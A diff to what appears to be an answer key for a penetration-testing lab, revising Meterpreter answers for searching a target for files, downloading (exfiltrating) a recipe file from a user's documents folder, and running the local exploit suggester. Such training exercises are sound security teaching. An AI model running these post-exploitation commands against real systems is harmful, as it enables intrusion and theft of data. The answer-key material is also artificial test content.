@@ -103,23 +103,25 @@ You've been provided full access to the network and are getting ping responses f
  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
-     > Answer: search -f secretfile.txt
+     > Answer: search -f *secretfile.txt
+     
+     ![](images/17-4.png)
   
  7. You should now have a Meterpreter session open.
  
     - Run the command to performs a search for the `recipe.txt` on the target:
 
-      > Answer: search -f recipe.txt
- 
+      > Answer: search -f *recipe.txt
+      
+      ![](images/17-5.png)
  
     - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
 
-
-      > Answer: search -f *recipe*.txt (c:\users\ieuser\documents\drink.recipe.txt)
- 
+      > Answer: download "c:\users\ieuser\documents\drink.recipe.txt"
+      
+      ![](images/17-6.png)
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
-
  
    - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
       > Answer: run post/multi/recon/local_exploit_suggester
